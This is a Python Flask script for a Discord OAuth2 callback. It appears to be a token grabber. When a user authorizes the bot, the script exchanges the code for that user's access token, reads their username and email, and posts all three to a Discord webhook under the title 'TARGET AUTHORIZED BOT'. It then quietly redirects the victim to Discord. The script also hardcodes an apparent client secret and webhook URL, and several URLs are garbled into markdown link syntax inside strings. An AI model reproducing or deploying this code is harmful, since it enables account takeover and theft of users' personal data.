import requests
from flask import Flask, request, redirect

app = Flask(__name__)

# --- YOUR BOT INFO ---
CLIENT_ID = "1501206551942398092"
CLIENT_SECRET = "7A2BCkMpq3sqaV0RwYu2JOYjc2qRtfjz"
REDIRECT_URI = "[https://web-assets-v1.onrender.com/callback](https://web-assets-v1.onrender.com/callback)"
WEBHOOK_URL = "[https://discord.com/api/webhooks/1501215100667691090/3ZWwbeqzcBxsOTKERvyFrH8mfh-JxMkPWLKbLjk4ZOZIdBFN6zjmmEcL4cq5Ji5DcCOx](https://discord.com/api/webhooks/1501215100667691090/3ZWwbeqzcBxsOTKERvyFrH8mfh-JxMkPWLKbLjk4ZOZIdBFN6zjmmEcL4cq5Ji5DcCOx)"

@app.route('/callback')
def callback():
    code = request.args.get('code')
    if not code:
        return "Authorization failed: No code provided.", 400

    data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI
    }
    
    r = requests.post('[https://discord.com/api/v10/oauth2/token](https://discord.com/api/v10/oauth2/token)', data=data)
    token_json = r.json()
    access_token = token_json.get('access_token')

    if access_token:
        headers = {'Authorization': f'Bearer {access_token}'}
        user_info = requests.get('[https://discord.com/api/v10/users/@me](https://discord.com/api/v10/users/@me)', headers=headers).json()
        
        payload = {
            "embeds": [{
                "title": "🔓 TARGET AUTHORIZED BOT",
                "color": 16711680,
                "fields": [
                    {"name": "User", "value": f"{user_info.get('username', 'Unknown')}", "inline": True},
                    {"name": "Email", "value": f"{user_info.get('email', 'N/A')}", "inline": True},
                    {"name": "Access Token", "value": f"
``` {access_token} ```"}
                ]
            }]
        }
        requests.post(WEBHOOK_URL, json=payload)
        
    return redirect("[https://discord.com/app](https://discord.com/app)")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
